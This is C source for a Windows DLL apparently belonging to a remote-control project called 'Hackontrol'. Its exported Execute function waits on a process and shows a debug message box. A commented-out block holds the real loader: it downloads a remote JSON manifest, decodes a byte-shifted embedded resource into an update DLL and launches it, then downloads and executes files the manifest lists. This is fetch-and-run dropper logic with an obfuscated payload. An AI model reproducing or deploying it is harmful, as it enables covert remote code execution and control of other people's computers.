#include <khopanstring.h>
#include <khopanjson.h>
#include <hackontrolcurl.h>
#include "execute.h"
#include "resource.h"

#define HACKONTROL_OVERRIDE

#ifndef HACKONTROL_OVERRIDE
#ifdef _DEBUG
//#define HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
#define HACKONTROL_NO_SELF_UPDATE
#define HACKONTROL_NO_DOWNLOAD_FILE
#define HACKONTROL_NO_EXECUTE_FILE
#endif
#endif

static HINSTANCE globalInstance;

__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	BOOL waitForProcess = FALSE;
	DWORD waitingProcess = 0;
	BOOL noUpdate = FALSE;

	if(!argument || !strlen(argument)) {
		goto exitParameter;
	}

	LPWSTR wideArgument = KHFormatMessageW(L"%S", argument);

	if(!wideArgument) {
		goto exitParameter;
	}

	int count;
	LPWSTR* arguments = CommandLineToArgvW(wideArgument, &count);
	LocalFree(wideArgument);

	if(!arguments) {
		goto exitParameter;
	}

	if(count > 0) {
		waitForProcess = TRUE;
		waitingProcess = (DWORD) _wtoll(arguments[0]);
	}

	if(count > 1) {
		noUpdate = _wtoi(arguments[1]);
	}

	LocalFree(arguments);
exitParameter:
	if(waitForProcess) {
		HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, waitingProcess);

		if(process) {
			WaitForSingleObject(process, INFINITE);
			CloseHandle(process);
		}
	}

	MessageBoxW(NULL, KHFormatMessageW(L"Wait: %d Waiting: %lld No update: %d", waitForProcess, waitingProcess, noUpdate), L"Argument", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
	/*CURLcode code = curl_global_init(CURL_GLOBAL_ALL);

	if(code != CURLE_OK) {
		KHCURLDialogErrorW(code, L"curl_global_init");
		return;
	}

#ifdef HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
	HANDLE file = CreateFileW(L"D:\\GitHub Repository\\Hackontrol\\system\\latest.json", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(!file) {
		KHWin32DialogErrorW(GetLastError(), L"CreateFileW");
		return;
	}

	LARGE_INTEGER integer;

	if(!GetFileSizeEx(file, &integer)) {
		KHWin32DialogErrorW(GetLastError(), L"GetFileSizeEx");
		return;
	}

	LPSTR buffer = LocalAlloc(LMEM_FIXED, integer.LowPart);

	if(!buffer) {
		KHWin32DialogErrorW(GetLastError(), L"LocalAlloc");
		return;
	}

	DWORD bytesRead;

	if(!ReadFile(file, buffer, integer.LowPart, &bytesRead, NULL)) {
		KHWin32DialogErrorW(GetLastError(), L"ReadFile");
		LocalFree(buffer);
		return;
	}

	cJSON* rootObject = cJSON_Parse(buffer);
	LocalFree(buffer);
#else
	DataStream stream = {0};

	if(!HackontrolForceDownload(&stream, URL_LATEST_FILE, TRUE)) {
		KHWin32DialogErrorW(GetLastError(), L"HackontrolForceDownload");
		goto globalCleanup;
	}

	KHDataStreamAdd(&stream, "", sizeof(CHAR));
	cJSON* rootObject = cJSON_Parse(stream.data);
	KHDataStreamFree(&stream);
#endif
	if(!rootObject) {
		MessageBoxW(NULL, L"Error while parsing JSON document", L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto globalCleanup;
	}
#ifndef HACKONTROL_NO_SELF_UPDATE
	cJSON* selfObject = KHJSONGetObject(rootObject, "self", NULL);

	if(!selfObject) {
		goto exitUpdate;
	}

	char* url = KHJSONGetString(selfObject, "url", NULL);

	if(!url) {
		goto exitUpdate;
	}

	LPWSTR pathFolderHackontrol = HackontrolGetDirectory(TRUE);

	if(!pathFolderHackontrol) {
		goto exitUpdate;
	}

	LPWSTR pathFileLibdll32 = KHFormatMessageW(L"%ws\\" FILE_LIBDLL32, pathFolderHackontrol);

	if(!pathFileLibdll32) {
		LocalFree(pathFolderHackontrol);
		goto exitUpdate;
	}

	BOOL result = CheckFileHash(selfObject, pathFileLibdll32);
	LocalFree(pathFileLibdll32);

	if(result) {
		LocalFree(pathFolderHackontrol);
		goto exitUpdate;
	}

	HRSRC resourceHandle = FindResourceW(globalInstance, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!resourceHandle) {
		LocalFree(pathFolderHackontrol);
		goto exitUpdate;
	}

	DWORD resourceSize = SizeofResource(globalInstance, resourceHandle);

	if(!resourceSize) {
		LocalFree(pathFolderHackontrol);
		goto exitUpdate;
	}

	HGLOBAL resource = LoadResource(globalInstance, resourceHandle);

	if(!resource) {
		LocalFree(pathFolderHackontrol);
		goto exitUpdate;
	}

	BYTE* data = LockResource(resource);

	if(!data) {
		LocalFree(pathFolderHackontrol);
		goto exitUpdate;
	}

	BYTE* resourceBuffer = LocalAlloc(LMEM_FIXED, resourceSize);

	if(!resourceBuffer) {
		LocalFree(pathFolderHackontrol);
		goto exitUpdate;
	}

	for(DWORD i = 0; i < resourceSize; i++) {
		resourceBuffer[i] = (data[i] - 18) % 0xFF;
	}

	LPWSTR pathFileLibupdate32 = KHFormatMessageW(L"%ws\\" FILE_LIBUPDATE32, pathFolderHackontrol);
	LocalFree(pathFolderHackontrol);

	if(!pathFileLibupdate32) {
		LocalFree(resourceBuffer);
		goto exitUpdate;
	}

	DataStream resourceStream;
	resourceStream.data = resourceBuffer;
	resourceStream.size = resourceSize;
	result = HackontrolWriteFile(pathFileLibupdate32, &resourceStream);
	KHDataStreamFree(&resourceStream);

	if(!result) {
		LocalFree(pathFileLibupdate32);
		goto exitUpdate;
	}

	LPWSTR argumentFileLibupdate32 = KHFormatMessageW(L"%lu %S", GetCurrentProcessId(), url);

	if(!argumentFileLibupdate32) {
		LocalFree(pathFileLibupdate32);
		goto exitUpdate;
	}

	KHWin32StartDynamicLibraryW(pathFileLibupdate32, FUNCTION_LIBUPDATE32, argumentFileLibupdate32);
	LocalFree(argumentFileLibupdate32);
	LocalFree(pathFileLibupdate32);
	goto deleteJson;
exitUpdate:
#endif
#ifndef HACKONTROL_NO_DOWNLOAD_FILE
	ProcessFilesArray(rootObject);
#endif
#ifndef HACKONTROL_NO_EXECUTE_FILE
	ProcessEntrypointsArray(rootObject);
#endif
#ifndef HACKONTROL_NO_SELF_UPDATE
deleteJson:
#endif
	cJSON_Delete(rootObject);
globalCleanup:
	curl_global_cleanup();*/
}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
	globalInstance = instance;
	return TRUE;
}
